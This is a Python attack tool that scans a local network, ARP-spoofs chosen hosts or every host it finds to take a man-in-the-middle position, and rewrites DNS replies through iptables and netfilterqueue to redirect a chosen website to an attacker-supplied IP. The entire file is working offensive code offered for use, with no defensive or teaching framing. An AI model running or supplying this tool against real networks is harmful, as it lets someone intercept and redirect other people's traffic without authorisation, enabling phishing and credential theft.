#!/usr/bin/env python

import scapy.all as scapy  # handle tasks like scanning and network discovery
import re  # regular expressions
import time  # use sleep() for delays
import sys  # info about the os
import multiprocessing
import netfilterqueue  # provides access to packets matched by an iptables rule in Linux
import subprocess


# function that returns a list with responses from a broadcast
def broadcast(ip):
    arp_request = scapy.ARP(pdst=ip)  # ARP object creation, asks who has target IP
    brdcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Ethernet object creation, set destination MAC to broadcast MAC
    arp_request_broadcast = brdcast / arp_request  # Combine into a single packet

    # Send packets with custom Ether, send packet and receive response. "timeout": Time to wait for response
    return scapy.srp(arp_request_broadcast, timeout=2, retry=3, verbose=False)[0]


# function that scans network IPs
def network_scanner():
    print('[+] Capturing Local Network Address...')
    time.sleep(0.1)
    route = re.findall(r'[0-9]+(?:\.[0-9]+){3}', str(scapy.conf.route))
    network, netmask, machine_ip = route[4], route[5], route[7]
    if network and netmask:
        print('Network: {}'.format(network))
        print('Netmask: {}'.format(netmask))
        print("Machine's IP: {}".format(machine_ip))
        try:
            cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
            scan_ip = network + '/' + str(cidr)
            print('[+] Scanning Network...')
            time.sleep(0.1)
            final = []
            for _ in range(0, 5):
                temp = [ip[1].psrc for ip in broadcast(scan_ip)]
                if len(temp) > len(final):
                    final = temp
            print('[+] Network scan complete.')
            try:
                final.remove(machine_ip)
            except ValueError:
                pass
            return final  # returns the list with the IPs
        except ValueError:
            print("[!] Something went wrong. Scan failed.")
            return
    else:
        print("[-] Could not read Network or Subnet Mask. Scan failed.")
        time.sleep(0.1)
        return


# function that returns target, source IPs from input
def ip_input(scan_list):
    print("IP Table")
    print("--------")
    for ip in scan_list:
        print(ip)
    print("--------")
    trgt = input('Your target IP: ')
    src = input('Your source IP: ')
    return trgt, src


# function that returns MAC address of selected IP
def get_mac(ip):
    answered_mac = broadcast(ip)
    try:
        return answered_mac[0][1].hwsrc
    except IndexError:
        print("[!] No response..")


# function that spoofs IPs
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # Target sees attacker's MAC address but thinks it's the router cause of the IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


# function that restores the communication of two devices
def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, count=4, verbose=False)  # count: number of times to send


# function that resets ARP tables and restores original connections
def cleanup(targets, src):
    for target_ip in targets:
        if target_ip != router_ip:
            restore(target_ip, src)
            restore(src, target_ip)
    print("[+] Done!")
    with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
        f.write("0")  # disable ip forwarding
    global allow_arp
    allow_arp = 1


# function that creates a Man in the Middle
def arp_spoof(targets, src):
    if SYS_PLATFORM == 'linux':
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write("1")  # enable ip forwarding to allow flow of packets through machine
            while True:
                for target_ip in targets:
                    if target_ip != router_ip:
                        spoof(target_ip, src)
                        spoof(src, target_ip)
                time.sleep(2)  # 2 seconds delay
        except Exception:
            print("[!] Something went wrong ... Resetting ARP Tables...")
            cleanup(targets, src)
    elif SYS_PLATFORM == 'win32':
        print('This is Windows OS')
        print('Under Construction')


# function that modifies DNS layer packets
def process_packet(packet, target_website, modified_ip):
    scapy_packet = scapy.IP(packet.get_payload())  # convert payload into a scapy packet
    if scapy_packet.haslayer(scapy.DNSRR):  # check if packet has a dns response layer
        qname = scapy_packet[scapy.DNSQR].qname.decode("utf-8")
        if target_website in qname:
            # create a dns response, keep the name, change the ip to the preferred one
            answer = scapy.DNSRR(rrname=qname, rdata=modified_ip)
            scapy_packet[scapy.DNS].an = answer  # modify the answer of the packet
            scapy_packet[scapy.DNS].ancount = 1  # modify the number of answers of the packet

            # remove variables that would corrupt the modified packet, scapy will auto redefine them
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))  # change the original payload of the packet with the modified one
    packet.accept()  # allow forwarding the packet to it's destination


# function that spoofs a DNS response
def dns_spoof(target_website, modified_ip):
    subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])
    queue = netfilterqueue.NetfilterQueue()  # object creation
    queue.bind(1,
               lambda packet, target_website=target_website, modified_ip=modified_ip:
               process_packet(packet, target_website, modified_ip)
               )  # connect to an existed queue
    try:
        queue.run()
    except Exception:
        print("[!] Something went wrong ... FlUSHING IPTABLES...")
        subprocess.run(["iptables", "--flush"])
        print("[+] Done.")
        global allow_dns
        allow_dns = 1


def kill_dns():
    try:
        if dns_process.is_alive():
            dns_process.terminate()
            print("[!] Dns process terminated ... FlUSHING IPTABLES...")
            subprocess.run(["iptables", "--flush"])
            print("[+] Done.")
            global allow_dns
            allow_dns = 1
        else:
            print('[-] No dns spoof running at the moment.')
    except NameError:
        print('[-] No dns spoof running at the moment.')


def kill_arp():
    try:
        if arp_process.is_alive():
            kill_dns()
            arp_process.terminate()
            print("[!] Arp process terminated ... Resetting ARP Tables...")
            cleanup(selected, source)
        else:
            print('[-] No arp spoof running at the moment.')
    except NameError:
        print('[-] No arp spoof running at the moment.')


########################
# INITIALIZE VARIABLES #
########################
SYS_PLATFORM = sys.platform  # os of the current machine
command = ''  # command to be executed
allow_arp = 1  # flag that shows if an arp spoof is already running
allow_dns = 1  # flag that shows if a dns spoof is already running
scan_result = []  # list of network IPs
router_ip = scapy.conf.route.route("0.0.0.0")[2]  # Router's ip

print('Welcome back Boss!')
while True:
    print("Insert your command:")
    command = input(">> ")
    # try:
    if command == "exit()":
        print("[+] Cya later Boss!")
        time.sleep(0.1)
        sys.exit()

    elif command == "scan()":
        scan_result = network_scanner()

    elif command == "arpspoof()":
        if allow_arp:
            if scan_result:
                option = ''
                while option != 'auto' and option != 'man':
                    print('Type "man" or "auto" for arpspoof()')
                    option = input(">> Option: ")
                if option == 'man':
                    selected = []
                    target, source = ip_input(scan_result)
                    while target not in scan_result or source not in scan_result:
                        print("[-] IPs not found in list. Try again")
                        time.sleep(0.1)
                        target, source = ip_input(scan_result)
                    selected.append(target)
                    arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
                    print("[+] Initializing Arp Spoof...")
                    time.sleep(0.1)
                    arp_process.start()
                    allow_arp = 0
                elif option == 'auto':
                    if router_ip:
                        source = router_ip
                        selected = scan_result
                        arp_process = multiprocessing.Process(target=arp_spoof, args=(selected, source))
                        print("[+] Initializing Arp Spoof...")
                        time.sleep(0.1)
                        arp_process.start()
                        allow_arp = 0
                    else:
                        print("[-] Router IP not found. Choose manually..")
                        time.sleep(0.1)
            else:
                print("[-] Network IPs not defined. Please scan() first.")
                time.sleep(0.1)
        else:
            print('[!] Arp spoof already running.')

    elif command == 'dnsspoof()':
        if allow_dns:
            try:
                if arp_process.is_alive():
                    target_website = input('Your target website: ')
                    modified_ip = input('Your redirect IP: ')
                    dns_process = multiprocessing.Process(target=dns_spoof, args=(target_website, modified_ip))
                    print("[+] Initializing Dns Spoof...")
                    time.sleep(0.1)
                    dns_process.start()
                    allow_dns = 0
                else:
                    print('[-] No arp spoof running at the moment.')
            except NameError:
                print('[-] No arp spoof running at the moment.')
        else:
            print('[!] Dns spoof already running.')

    elif command == 'killarp()':
        kill_arp()

    elif command == 'killdns()':
        kill_dns()

    elif command == "help()":
        print("----------------------------------")
        print("COMMANDS        DESCRIPTION")
        print("----------------------------------")
        print("help()          Show commands")
        print("scan()          Network scanning")
        print("arpspoof()      Manual or Auto Arp Spoof")
        print("dnsspoof()      DNS Spoof Attack")
        print("killarp()       Kill process running Arp Spoof")
        print("killdns()       Kill process running Dns Spoof")
        print("exit()          Exit the app")
        print("----------------------------------")

    else:
        print('[-] Command not found. Type help() to show commands.')

    # except Exception:
    #     print('[-] Error during command execution.')
